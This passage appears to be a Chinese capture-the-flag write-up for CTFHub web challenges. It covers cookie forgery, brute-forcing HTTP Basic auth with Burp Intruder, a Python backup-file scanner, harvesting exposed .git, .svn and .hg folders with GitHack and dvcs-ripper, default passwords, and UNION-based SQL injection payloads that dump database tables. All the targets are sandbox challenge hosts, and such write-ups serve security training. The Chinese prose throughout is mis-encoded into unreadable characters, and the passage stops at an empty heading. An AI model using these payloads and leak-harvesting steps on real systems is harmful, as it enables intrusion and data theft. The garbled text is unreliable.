302è·³è½¬\n\n **é¢˜ç›®è€ƒç‚¹ï¼šHTTPçŠ¶æ€ç **\n\n> çŠ¶æ€ç 3**,ä»£è¡¨é‡å®šå‘\n\n| çŠ¶æ€ç  | çŠ¶æ€ç è‹±æ–‡åç§° | ä¸­æ–‡æè¿°                                                     |\n| ------ | -------------- | ------------------------------------------------------------ |\n| 302    | Found          | ä¸´æ—¶ç§»åŠ¨ã€‚ä¸301ç±»ä¼¼ã€‚ä½†èµ„æºåªæ˜¯ä¸´æ—¶è¢«ç§»åŠ¨ã€‚å®¢æˆ·ç«¯åº”ç»§ç»­ä½¿ç”¨åŸæœ‰URI |\n\næ›´å¤šçŠ¶æ€ç è¯¦æƒ…è¯·çœ‹:https://www.runoob.com/http/http-status-codes.html)\n\nç”¨æµè§ˆå™¨è®¿é—®index.phpå‘ç°ä¼š302è·³è½¬åˆ° index.html\n\n**æ–¹æ³•ä¸€ï¼šä½¿ç”¨curl**\n\n```\ncurl -v CTFHUB http://challenge-45da4bfe747dae4b.sandbox.ctfhub.com:10080/index.php\n```\n\n**æ–¹æ³•äºŒï¼šä½¿ç”¨BurpæŠ“åŒ…**\n\n**æ‰©å±•çŸ¥è¯†ï¼šé‡å®šå‘å’Œè¯·æ±‚è½¬å‘**\n\nHTTPä¸­çš„é‡å®šå‘å’Œè¯·æ±‚è½¬å‘çš„åŒºåˆ«ï¼šè½¬å‘æ˜¯æœåŠ¡å™¨è¡Œä¸ºï¼Œé‡å®šå‘æ˜¯å®¢æˆ·ç«¯è¡Œä¸ºã€‚\n\n`è½¬å‘è¿‡ç¨‹ï¼š`å®¢æˆ·æµè§ˆå™¨å‘é€HTTPè¯·æ±‚â¡â¡â¡WebæœåŠ¡å™¨æ¥å—è¯·æ±‚â¡â¡â¡è°ƒç”¨å†…éƒ¨æ–¹æ³•åœ¨å®¹å™¨å†…éƒ¨å®Œæˆè¯·æ±‚å¤„ç†å’Œè½¬å‘åŠ¨ä½œâ¡â¡â¡å°†ç›®æ ‡èµ„æºå‘é€ç»™å®¢æˆ·\n\n`é‡å®šå‘è¿‡ç¨‹ï¼š`å®¢æˆ·æµè§ˆå™¨å‘é€HTTPè¯·æ±‚â¡â¡â¡webæœåŠ¡å™¨æ¥å—å‘é€302çŠ¶æ€ç å“åº”åŠå¯¹åº”æ–°çš„locationç»™å®¢æˆ·æµè§ˆå™¨â¡â¡â¡å®¢æˆ·æµè§ˆå™¨å‘ç°æ˜¯302å“åº”ï¼Œåˆ™è‡ªåŠ¨å†å‘é€ä¸€ä¸ªæ–°çš„HTTPè¯·æ±‚ï¼Œè¯·æ±‚urlæ˜¯æ–°çš„locationåœ°å€â¡â¡â¡æœåŠ¡å™¨æ ¹æ®æ­¤è¯·æ±‚å¯»æ‰¾èµ„æºå¹¶å‘é€ç»™å®¢æˆ·\n\n#### Cookie\n\n **é¢˜ç›®è€ƒç‚¹ï¼šCookieæ¬ºéª—ã€è®¤è¯ã€ä¼ªé€ **\n\n> cookieæ˜¯ç”±åç«¯æœåŠ¡å™¨ç«¯åˆ›å»ºä¿å­˜åœ¨å®¢æœç«¯ä¸€ç§æ•°æ®åº“ç»“æ„ã€‚æµè§ˆå™¨è¯·æ±‚å’Œåç«¯æœåŠ¡ç«¯å“åº”éƒ½ä¼šæºå¸¦åˆ›å»ºçš„cookieæ¥å›ä¼ è¾“ã€‚cookieåœ¨ä¼ è¾“æ—¶å­˜å‚¨åœ¨è¯·æ±‚å¤´å’Œå“åº”å¤´ä¸­ã€‚\n\næ‰“å¼€é“¾æ¥ï¼Œæ˜¾ç¤ºä¸€å¥è¯\n\n```\nhello guest. only admin can get flag.\n```\n\nBurp æŠ“åŒ…å‘ç°Cookieï¼šadmin=0ï¼ŒæŠŠ0æ”¹ä¸º1é‡æ–°å‘åŒ…ï¼Œå°±å¾—åˆ°flagäº†\n\n![](https://img.jwt1399.top//img/20200717104635.png)\n\n**æ‰©å±•çŸ¥è¯†ï¼šcookieå’Œsession**\n\ncookieå’Œsessionçš„åŒºåˆ«ï¼šcookieæ˜¯å­˜åœ¨äºå®¢æˆ·ç«¯çš„ï¼Œè€Œsessionæ˜¯å­˜åœ¨äºæœåŠ¡å™¨ç«¯çš„\n\n`cookieï¼š`webæœåŠ¡æ‰€ä½¿ç”¨çš„HTTPæœåŠ¡æ˜¯æ— çŠ¶æ€çš„ã€‚è¿™å°±æ„å‘³ç€ï¼ŒæœåŠ¡å™¨æ— æ³•åˆ†è¾¨æ”¶åˆ°çš„è¯·æ±‚æ˜¯å±äºå“ªä¸€ä¸ªç”¨æˆ·çš„ï¼Œéœ€è¦é€šè¿‡cookieæ¥å¯¹ç”¨æˆ·çš„èº«ä»½è¿›è¡Œæ ‡è¯†äº†ï¼Œç”¨æˆ·æ¯æ¬¡å¯¹æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œéƒ½å¸¦ä¸Šè‡ªå·±ç‹¬æœ‰çš„cookieï¼ŒæœåŠ¡å™¨é€šè¿‡è¯»å–cookieä¿¡æ¯ï¼Œè¯†åˆ«ç”¨æˆ·ã€‚\n\n`sessionï¼š`sessionå’Œcookieçš„ä½œç”¨æœ‰ç‚¹ç±»ä¼¼ï¼Œéƒ½æ˜¯ä¸ºäº†å­˜å‚¨ç”¨æˆ·ç›¸å…³çš„ä¿¡æ¯ã€‚å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ•°æ®ä¼šæ›´åŠ çš„å®‰å…¨ï¼Œä¸å®¹æ˜“è¢«çªƒå–ã€‚ä½†å­˜å‚¨åœ¨æœåŠ¡å™¨ä¹Ÿæœ‰ä¸€å®šçš„å¼Šç«¯ï¼Œå°±æ˜¯ä¼šå ç”¨æœåŠ¡å™¨çš„èµ„æºã€‚\n\n#### åŸºç¡€è®¤è¯\n\n**é¢˜ç›®è€ƒç‚¹ï¼šHTTP åŸºç¡€è®¤è¯ã€çˆ†ç ´**\n\n> åœ¨HTTPä¸­ï¼ŒåŸºæœ¬è®¤è¯ï¼ˆè‹±è¯­ï¼šBasic access authenticationï¼‰æ˜¯å…è®¸httpç”¨æˆ·ä»£ç†ï¼ˆå¦‚ï¼šç½‘é¡µæµè§ˆå™¨ï¼‰åœ¨è¯·æ±‚æ—¶ï¼Œæä¾› ç”¨æˆ·å å’Œ å¯†ç  çš„ä¸€ç§æ–¹å¼ã€‚è¯¦æƒ…è¯·æŸ¥çœ‹ https://zh.wikipedia.org/wiki/HTTPåŸºæœ¬è®¤è¯\n\n**HTTPåŸºæœ¬è®¤è¯çš„è¿‡ç¨‹:**\n\nâ‘ `è¯·æ±‚ï¼š`å®¢æˆ·ç«¯å‘é€`HTTP Request`ç»™æœåŠ¡å™¨\n\nâ‘¡`è´¨è¯¢ï¼š`å› ä¸ºrequestä¸­æ²¡æœ‰åŒ…å«Authorization headeræˆ–è€…é”™è¯¯åŒ…å«, æœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ª`401 Unauthozied`ç»™å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”åœ¨`Response`çš„ header \"`WWW-Authenticate`\" ä¸­æ·»åŠ ä¿¡æ¯ã€‚\n\nâ‘¢`æˆæƒï¼š`å®¢æˆ·ç«¯è¾“å…¥ç”¨æˆ·åå’Œå¯†ç å¹¶ç”¨base64åŠ å¯†åï¼Œæ”¾åœ¨`Authorization header` ä¸­å‘é€ç»™æœåŠ¡å™¨ã€‚\n\nâ‘£`æˆåŠŸï¼š`æœåŠ¡å™¨å°†`Authorization header`ä¸­çš„ç”¨æˆ·åå¯†ç å–å‡ºï¼Œè¿›è¡ŒéªŒè¯ï¼Œ å¦‚æœéªŒè¯é€šè¿‡ï¼Œå°†æ ¹æ®è¯·æ±‚ï¼Œå‘é€èµ„æºç»™å®¢æˆ·ç«¯\n\n| æ‰“å¼€é“¾æ¥                                             | ç‚¹å‡»click,éœ€è¦ç”¨æˆ·åå’Œå¯†ç                            |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200717155458.png) | ![](https://img.jwt1399.top//img/20200717155508.png) |\n\néšä¾¿è¾“ä¸ªè´¦å·å¯†ç ï¼ˆè´¦å·jwt å¯†ç  123ï¼‰ï¼Œä½¿ç”¨BurpSuite æŠ“åŒ…\n\nâ‘ `è¯·æ±‚ï¼š`å‘é€`HTTP Request`ç»™æœåŠ¡å™¨\n\n![](https://img.jwt1399.top//img/20200717155508.png)\n\nâ‘¡`è´¨è¯¢ï¼š`å› ä¸ºrequestä¸­é”™è¯¯åŒ…å«Authorization header, æœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ª`401 Unauthozied`ç»™å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”åœ¨`Response`çš„ header \"`WWW-Authenticate`\" ä¸­æ·»åŠ ä¿¡æ¯ã€‚\n\n![](https://img.jwt1399.top//img/20200717162814.png)\n\nå¾—åˆ°æç¤º `Do u konw admin ?`ï¼Œäºæ˜¯çŒœæµ‹è´¦å·æ˜¯ `admin` , åº”è¯¥å°±æ˜¯HTTP è¯·æ±‚å¤´éƒ¨çš„ Authorization å­—æ®µä¸­çš„è´¦å·å¯†ç é”™è¯¯ï¼Œéœ€è¦æˆ‘ä»¬çˆ†ç ´ï¼Œé¢˜ç›®ä¹Ÿç»™äº†å­—å…¸\n\n```\nAuthorization: Basic and0OjEyMw==\n\nBasicè¡¨ç¤ºæ˜¯ã€ŒåŸºç¡€è®¤è¯ã€, åé¢çš„ and0OjEyMw== ç”¨ base64 è§£ç åæ˜¯ jwt:123 , ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¹‹å‰è¾“å…¥çš„è´¦å·å’Œå¯†ç \næ ¹æ®æç¤ºï¼Œå®¹æ˜“çŒœæµ‹ç”¨æˆ·åä¸º admin ï¼Œé‚£ä¹ˆ Authorization å¤´å­—æ®µçš„æ ¼å¼å°±åº”è¯¥ä¸º\nAuthorization: Basic base64(admin:å¯†ç )\n```\n\nâ‘¢`æˆæƒï¼š`å®¢æˆ·ç«¯è¾“å…¥ç”¨æˆ·åå’Œå¯†ç å¹¶ç”¨base64åŠ å¯†åï¼Œæ”¾åœ¨`Authorization header` ä¸­å‘é€ç»™æœåŠ¡å™¨ã€‚\n\n1.å°†æŠ¥æ–‡å‘é€åˆ° `Intruder`, å°† `Basic` åé¢ `base64` éƒ¨åˆ†æ·»åŠ ä¸º `payload position`\n\n![](https://img.jwt1399.top//img/20200717162830.png)\n\n2.åœ¨ `æœ‰æ•ˆè½½è·` é€‰é¡¹å¡ä¸‹ï¼Œé€‰æ‹© `æœ‰æ•ˆè½½è·é›†` ä¸º `è¿è¡Œæ—¶æ–‡ä»¶`, ç„¶ååœ¨ `æœ‰æ•ˆè½½è·` ä¸­ç‚¹å‡» `æ–‡ä»¶é€‰æ‹©` åŠ è½½å¯†ç å­—å…¸\n\n![](https://img.jwt1399.top//img/20200717162836.png)\n\n3.æœ‰æ•ˆè´Ÿè½½å¤„ç†` -> `æ·»åŠ `->` æ·»åŠ å‰ç¼€`->` è¾“å…¥ `admin:`\n\n\n![](https://img.jwt1399.top//img/20200717162847.png)\n\n4.æœ‰æ•ˆè´Ÿè½½å¤„ç†` -> `æ·»åŠ `->` ç¼–ç `->` Base64ç¼–ç \n\n![](https://img.jwt1399.top//img/20200717162847.png)\n\n5.`æœ‰æ•ˆè½½è·ç¼–ç ` å–æ¶ˆå‹¾é€‰çš„ `URLç¼–ç è¿™äº›å­—ç¬¦`, ä¸å–æ¶ˆçš„è¯ base64 ä¹‹åçš„ `=` ä¼šè¢«è½¬æˆ `%3d` ï¼Œè¿™æ ·å°±çˆ†ä¸å‡ºå¯†ç \n\n![](https://img.jwt1399.top//img/20200717162857.png)\n\n6.ç‚¹å‡»`å¼€å§‹æ”»å‡»` ï¼Œç„¶åç‚¹å‡» `çŠ¶æ€` æ’åºï¼Œçœ‹åˆ°çŠ¶æ€ç å‡ºç° 200 çš„ï¼Œå³çˆ†ç ´æˆåŠŸ\n\n![](https://img.jwt1399.top//img/20200717162916.png)\n\n7.æŸ¥çœ‹ `Response` å¾—åˆ° flag\n\n![](https://img.jwt1399.top//img/20200717162913.png)\n\n#### å“åº”åŒ…æºä»£ç \n\n**é¢˜ç›®è€ƒç‚¹ï¼šHTTPå“åº”åŒ…æºä»£ç æŸ¥çœ‹**\n\n1.æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°ç•Œé¢ä¸ºä¸€è´ªåƒè›‡å°æ¸¸æˆç•Œé¢ï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼Œåº”è¯¥ä¸å“åº”åŒ…æœ‰å…³\n\n2.F12å®¡æŸ¥å…ƒç´ ï¼Œç›´æ¥åœ¨å“åº”åŒ…ä¸­å‘ç°flag\n\n## ä¿¡æ¯æ³„éœ²\n\n### ç›®å½•éå†\n\næ‰“å¼€ç½‘ç«™ï¼Œæç¤ºç‚¹å‡»å¯»æ‰¾flag,ä¹‹åä¼šè·³è½¬åˆ°`flag_in_here`è¿™ä¸ªç›®å½•ï¼ŒæŒ¨ä¸ªå¯¹é‡Œé¢çš„ç›®å½•è¿›è¡Œå¯»æ‰¾,å°±èƒ½æ‰¾åˆ°flag\n\n### PHPINFO\n\næ‰“å¼€é¢˜ç›®ä¹‹åæç¤ºè®©ç‚¹å‡»æŸ¥çœ‹phpinfoï¼Œç„¶åCtrl+Fæœç´¢flagï¼Œå°±æ‰¾åˆ°äº†\n\n### å¤‡ä»½æ–‡ä»¶ä¸‹è½½\n\n#### ç½‘ç«™å¤‡ä»½\n\n> å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶å\n>\n> list1 = ['web', 'website', 'backup', 'back', 'www', 'wwwroot', 'temp']\n>\n> å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€\n>\n> list2 = ['tar', 'tar.gz', 'zip', 'rar']\n\n```python\n#python3\nimport requests\n# url1ä¸ºè¢«æ‰«æåœ°å€ï¼Œåä¸åŠ â€˜/â€™\nurl1 = 'http://challenge-3d8be6a2b5195774.sandbox.ctfhub.com:10080'\n# å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶å\nlist1 = ['web', 'website', 'backup', 'back', 'www', 'wwwroot', 'temp']\n# å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€\nlist2 = ['tar', 'tar.gz', 'zip', 'rar']\n\nfor i in list1:\n    for j in list2:\n        back = str(i) + '.' + str(j)\n        url2 = str(url1) + '/' + back\n        print(back + '    ', end='')\n        print(len(requests.get(url2).text))\n```\n\nå¯¹å¸¸è§çš„å¤‡ä»½æ–‡ä»¶è¿›è¡Œæ‰«æï¼Œå‘ç°å­˜åœ¨`www.zip`ï¼Œè§£å‹å¾—åˆ°çš„txtä¸­å‘ç°flag\n\n#### bakæ–‡ä»¶\n\n> xxx.bakä¸ºå¤‡ä»½æ–‡ä»¶\n\n```\ncurl http://challenge-c86ab07eaf0058b1.sandbox.ctfhub.com:10080/.index.php.bak\n```\n\n#### Vimç¼“å­˜\n\n>åœ¨ä½¿ç”¨vimæ—¶ä¼šåˆ›å»ºä¸´æ—¶ç¼“å­˜æ–‡ä»¶ï¼Œå…³é—­vimæ—¶ç¼“å­˜æ–‡ä»¶åˆ™ä¼šè¢«åˆ é™¤ï¼Œå½“vimå¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹\n>ä»¥ index.php ä¸ºä¾‹ï¼šç¬¬ä¸€æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º `.index.php.swp`\n>å†æ¬¡æ„å¤–é€€å‡ºåï¼Œå°†ä¼šäº§ç”Ÿåä¸º `.index.php.swo` çš„äº¤æ¢æ–‡ä»¶\n>ç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º `.index.php.swn`\n\n```\ncurl http://challenge-c86ab07eaf0058b1.sandbox.ctfhub.com:10080/.index.php.swp\n```\n\n#### .DS_Store\n\n> .DS_Store(è‹±æ–‡å…¨ç§° Desktop Services Store)æ˜¯ä¸€ç§ç”±è‹¹æœå…¬å¸çš„Mac OS Xæ“ä½œç³»ç»Ÿæ‰€åˆ›é€ çš„éšè—æ–‡ä»¶ï¼Œç›®çš„åœ¨äºå­˜è´®ç›®å½•çš„è‡ªå®šä¹‰å±æ€§ï¼Œä¾‹å¦‚æ–‡ä»¶ä»¬çš„å›¾æ ‡ä½ç½®æˆ–è€…æ˜¯èƒŒæ™¯è‰²çš„é€‰æ‹©ã€‚ç›¸å½“äº Windows ä¸‹çš„ desktop.iniã€‚\n\n**æ–¹æ³•ä¸€--ç”¨curlç›´æ¥æŸ¥çœ‹**\n\n```\ncurl http://challenge-c86ab07eaf0058b1.sandbox.ctfhub.com:10080/.DS_Store --output a.txt\n```\n\næŸ¥çœ‹a.txtå‘ç°æœ‰ä¸ª3ca5353db1943cc0e1e108d40d5fbb99.txtï¼ŒæŸ¥çœ‹è¯¥txtå¾—åˆ°flag\n\n**æ–¹æ³•äºŒ--åˆ©ç”¨å·¥å…·è§£æ**\n\nè¯¦æƒ…çœ‹æˆ‘å¦å¤–ä¸€ç¯‡æ–‡ç« ï¼š[.DS_Storeæ–‡ä»¶æ³„æ¼åˆ©ç”¨è„šæœ¬](https://www.jianshu.com/p/8de8930425c9)\n\n### Gitæ³„éœ²\n\n> å½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨`git`è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´ã€‚å·¥å…·ï¼š[GitHack](https://github.com/BugScanTeam/GitHack)\n\n```bash\nGitå¸¸è§çš„åˆ©ç”¨ï¼š\nâ‘ .git/indexä¸­ä¼šç¼“å­˜git addçš„æ–‡ä»¶ï¼Œè¿™é‡Œåœ¨æ²¡æœ‰commitçš„æƒ…å†µä¸‹ï¼Œä¹Ÿæ˜¯å­˜åœ¨çš„\nâ‘¡.git/refs/heads/master è®°å½•äº†masterçš„commitçš„hashï¼Œç”±æ­¤å¯ä»¥è§£æå‡ºè¿™ä¸ªcommitçš„æ‰€æœ‰æ–‡ä»¶\nâ‘¢.git/logs/HEADå…¶ä¸­å­˜å‚¨äº†gitçš„logä¿¡æ¯ï¼Œå¯ä»¥æ‰¾åˆ°å†å²çš„commité¡¹\nâ‘£.git/refs/stash å·¥ä½œè¿›åº¦çš„ä¸´æ—¶ä¿å­˜\nâ‘¤.git/info/packs packsæ–‡ä»¶æå–æ¢å¤\n```\n\n#### Log\n\n1.ä½¿ç”¨dirsearchå·¥å…·æ‰«æç½‘ç«™ç›®å½•ï¼Œå‘ç°gitæ³„éœ².git/logs/HEADï¼Œåœ¨gitä¸­æ˜¯å­˜å‚¨å†å²è®°å½•çš„\n\n```bash\npython3 dirsearch.py -u \"http://challenge-89c367ed8802f5e5.sandbox.ctfhub.com:10080\" -e *\n```\n\n2.ä½¿ç”¨GitHackå·¥å…·å…‹éš†ç›®æ ‡æºä»£ç åˆ°æœ¬åœ°\n\n```bash\npython GitHack.py http://challenge-89c367ed8802f5e5.sandbox.ctfhub.com:10080/.git/\n```\n\n3.æ‰§è¡Œ`git log`æŸ¥çœ‹commitå†å²è®°å½•  å¯ä»¥çœ‹åˆ°å½“å‰ç‰ˆæœ¬æ˜¯remove flagï¼Œæˆ‘ä»¬è¦çš„flagåœ¨add flagä¸­\n\n![](https://img.jwt1399.top//img/20200716180358.png)\n\n4.æ–¹æ³•1ï¼šä½¿ç”¨`git diff`ç›´æ¥ä¸ `add flag (e2f0)` è¿™æ¬¡æäº¤è¿›è¡Œå·®å¼‚æ¯”å¯¹\n\n![](https://img.jwt1399.top//img/20200716180418.png)\n\n5.æ–¹æ³•2ï¼šä½¿ç”¨`git reset --hard <file>`ç›´æ¥åˆ‡æ¢åˆ° `add flag (e2f0)` è¿™ä¸ªç‰ˆæœ¬\n\n![](https://img.jwt1399.top//img/20200716180403.png)\n\n#### Stash\n\n> Stashï¼šèƒ½å¤Ÿå°†æ‰€æœ‰æœªæäº¤çš„ä¿®æ”¹ï¼ˆå·¥ä½œåŒºå’Œæš‚å­˜åŒºï¼‰ä¿å­˜è‡³å †æ ˆä¸­ï¼Œç”¨äºåç»­æ¢å¤å½“å‰å·¥ä½œç›®å½•ã€‚\n\n1.ä½¿ç”¨dirsearchæ‰«æç½‘ç«™ç›®å½•ï¼Œå‘ç°gitæ³„éœ²`.git/refs/stash` ï¼Œåœ¨gitä¸­æ˜¯æš‚å­˜åŒºçš„æ„æ€\n\n```bash\npython3 dirsearch.py -u \"http://challenge-ba5511373d69c409.sandbox.ctfhub.com:10080/\" -e *\n```\n\n2.ä½¿ç”¨GitHackå…‹éš†ç›®æ ‡æºä»£ç åˆ°æœ¬åœ°\n\n```bash\npython GitHack.py http://challenge-ba5511373d69c409.sandbox.ctfhub.com:10080//.git/\n```\n\n3.æ–¹æ³•ä¸€ï¼šä½¿ç”¨`git stash list` æ˜¾ç¤ºä¿å­˜è¿›åº¦çš„åˆ—è¡¨ï¼Œå‘ç°æœ‰ stash\n\n![](https://img.jwt1399.top//img/20200716180428.png)\n\nä½¿ç”¨`git stash pop` æ¢å¤æœ€æ–°çš„è¿›åº¦åˆ°å·¥ä½œåŒºï¼Œè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å°±æ˜¯ flag\n\n![](https://img.jwt1399.top//img/20200716180431.png)\n\n4.æ–¹æ³•äºŒï¼šæŸ¥çœ‹ `.git/refs/stash` æ‰¾åˆ° `stash` å¯¹åº”çš„ `hash`ï¼Œä½¿ç”¨`git diff b59e90` å³å¯çœ‹åˆ° flag\n\n![](https://img.jwt1399.top//img/20200716180458.png)\n\n#### Index\n\nè¿˜æ˜¯å…ˆä½¿ç”¨GitHackå…‹éš†ç›®æ ‡æºä»£ç åˆ°æœ¬åœ°ï¼Œå› ä¸ºé¢˜ç›®æ˜¯indexï¼Œæ‰€ä»¥è€ƒè™‘gitçš„indexæš‚å­˜åŒºæ–‡ä»¶ï¼Œæ‰“å¼€å…‹éš†å¥½çš„æ–‡ä»¶å¤¹å‘ç°flag\n\n### SVNæ³„éœ²\n\n> å½“å¼€å‘äººå‘˜ä½¿ç”¨ `SVN` è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.svnæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† SVN æ³„éœ²æ¼æ´ã€‚å·¥å…·ï¼š[dvcs-ripper](https://github.com/kost/dvcs-ripper)\n\n1.ä½¿ç”¨`dirsearch`æ‰«æå‘ç°æœ‰ `.svn/` ç›®å½•ï¼Œç¡®è®¤æ˜¯ `.svn` æ³„éœ²ã€‚\n\n```bash\npython3 dirsearch.py -u \"http://challenge-8df627014df49067.san dbox.ctfhub.com:10080/\" -e *\n```\n\n2.ä½¿ç”¨ `dvcs-ripper` å·¥å…·ä¸­çš„ `rip-svn.pl` è„šæœ¬è¿›è¡Œ clone.\n\n```bash\ncd dvcs-ripper\n\nperl rip-svn.pl -v -u http://challenge-8df627014df49067.sandbox.ctfhub.com:10080/.svn/\n```\n\n![](https://img.jwt1399.top//img/20200716193721.png)\n\n3.è¿›å…¥`.svn/pristine/`æ–‡ä»¶å¤¹ä¸‹ï¼Œ åœ¨`bf`æ–‡ä»¶å¤¹ä¸‹å‘ç°`xxx.svn-base`æºç æ–‡ä»¶ï¼ŒæŸ¥çœ‹å¾—åˆ°flag\n\n![](https://img.jwt1399.top//img/20200716193224.png)\n\n### HGæ³„éœ²\n\n> å½“å¼€å‘äººå‘˜ä½¿ç”¨ `Mercurial` è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.hg æ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† hg æ³„éœ²æ¼æ´ã€‚[dvcs-ripper](https://github.com/kost/dvcs-ripper)\n\n1.ä½¿ç”¨`dirsearch`æ‰«æå‘ç°æœ‰ `.hg/` ç›®å½•ï¼Œç¡®è®¤æ˜¯ `.hg` æ³„éœ²ã€‚\n\n```bash\npython3 dirsearch.py -u \"http://challenge-a6460a92a6b0ee37.sandbox.ctfhub.com:10080/\" -e *\n```\n\n2.ä½¿ç”¨ `dvcs-ripper` å·¥å…·ä¸­çš„ `rip-svn.pl` è„šæœ¬è¿›è¡Œ clone.\n\n```\ncd dvcs-ripper\n\nperl rip-hg.pl -v -u http://challenge-a6460a92a6b0ee37.sandbox.ctfhub.com:10080/.hg/\n```\n\n3.æŸ¥çœ‹`.hg/store/fncache`ï¼Œå¾—åˆ°flag çš„æ–‡ä»¶åä¸º`flag_849825983.txt`ï¼Œç›´æ¥è®¿é—®å³å¯å¾— flag\n\n```bash\ncat .hg/store/fncache\n```\n\n![](https://img.jwt1399.top//img/20200716195910.png)\n\n```bash\ncurl http://challenge-a6460a92a6b0ee37.sandbox.ctfhub.com:10080/flag_849825983.txt\næˆ–è€…\ncurl http://challenge-a6460a92a6b0ee37.sandbox.ctfhub.com:10080/.hg/store/data/flag_849825983.txt.i\n```\n\n![](https://img.jwt1399.top//img/20200716195914.png)\n\nå‚è€ƒï¼š[å¸¸è§Webæºç æ³„éœ²æ€»ç»“](https://www.secpulse.com/archives/55286.html)\n\n## å¯†ç å£ä»¤\n\n### å¼±å£ä»¤\n\n> é€šå¸¸è®¤ä¸ºå®¹æ˜“è¢«åˆ«äººï¼ˆä»–ä»¬æœ‰å¯èƒ½å¯¹ä½ å¾ˆäº†è§£ï¼‰çŒœæµ‹åˆ°æˆ–è¢«ç ´è§£å·¥å…·ç ´è§£çš„å£ä»¤å‡ä¸ºå¼±å£ä»¤ã€‚\n\næ‰“å¼€é“¾æ¥æ˜¯ä¸€ä¸ªåå°ç™»å½•é¡µé¢ï¼Œç›´æ¥BurpæŠ“åŒ…ï¼ŒçŒœæµ‹ç”¨æˆ·åä¸ºadmin,ä½¿ç”¨Intruderæ¨¡å—è¿›è¡Œå¯†ç çˆ†ç ´ï¼Œå¾—åˆ°å¯†ç ä¸ºpasswordï¼Œç™»å½•å³å¯å¾—åˆ°flag\n\n### é»˜è®¤å£ä»¤\n\næ‰“å¼€é¡µé¢åï¼Œå‘ç°æ˜¯äº¿é‚®é‚®ä»¶ç½‘å…³ï¼Œç»ç™¾åº¦æŸ¥è¯¢[äº¿é‚®é‚®ä»¶ç½‘å…³ç³»ç»Ÿé»˜è®¤å£ä»¤](https://www.uedbox.com/post/23317/)ï¼Œç›´æ¥æŸ¥åˆ°è´¦æˆ·å’Œå¯†ç ï¼Œç™»å½•å³å¯å¾—åˆ°flag\n\n## SQLæ³¨å…¥\n\n### æ•´æ•°å‹æ³¨å…¥\n\n```sql\n#æŸ¥çœ‹é¡µé¢å˜åŒ–ï¼Œåˆ¤æ–­sqlæ³¨å…¥ç±»åˆ«ã€ä¸ºæ•°å­—å‹æ³¨å…¥ã€‘\n1\n\n#ç¡®å®šå­—æ®µæ•°ã€å­—æ®µæ•°ä¸º2ã€‘\n1 order by  1\n1 order by  2\n1 order by  3\n\n#ç¡®å®šå­—æ®µé¡ºåº\n1 union select 1,2\n\n#çˆ†æ•°æ®åº“åã€sqliã€‘\n-1 union select 1,database()\n\n#çˆ†è¡¨åã€news,flagã€‘\n-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'\n\n#çˆ†åˆ—åã€flagã€‘\n-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'\n\n#çˆ†å€¼\n-1 union select 1,flag from flag\n```\n\n![](https://img.jwt1399.top//img/20200718144309.png)\n\n### å­—ç¬¦å‹æ³¨å…¥\n\n```sql\n#æŸ¥çœ‹é¡µé¢å˜åŒ–ï¼Œåˆ¤æ–­sqlæ³¨å…¥ç±»åˆ«ã€ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‘\n1\n\n#ç¡®å®šå­—æ®µæ•°ã€å­—æ®µæ•°ä¸º2ã€‘\n1' order by  1 #\n1' order by  2 #\n1' order by  3 #\n\n#ç¡®å®šå­—æ®µé¡ºåº\n-1' union select 1,2 #\n\n#çˆ†æ•°æ®åº“åã€sqliã€‘\n-1' union select 1,database() #\næˆ–è€…å°†#æ”¹ä¸º--ç©ºæ ¼\n\n\n#çˆ†è¡¨åã€news,flagã€‘\n-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli' #\n\n\n#çˆ†åˆ—åã€flagã€‘\n-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' #\n\n#çˆ†å€¼\n-1' union select 1,flag from flag #\n```\n\n### 